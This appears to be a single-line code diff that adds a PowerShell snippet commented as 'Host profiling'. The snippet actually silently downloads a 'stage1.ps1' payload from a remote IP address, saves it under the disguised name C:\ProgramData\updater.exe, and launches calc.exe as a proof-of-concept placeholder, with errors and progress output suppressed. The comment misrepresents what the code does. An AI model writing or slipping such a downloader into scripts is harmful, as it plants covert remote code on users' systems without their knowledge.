@@ -1,0 +1,1 @@
+<# Host profiling #> $RemoteUrl = "http://198.51.100.191/stage1.ps1"; $DropPath = 'C:\ProgramData\updater.exe'; $ConnectionTimeout = 162; Start-BitsTransfer -Source $RemoteUrl -Destination $DropPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue"
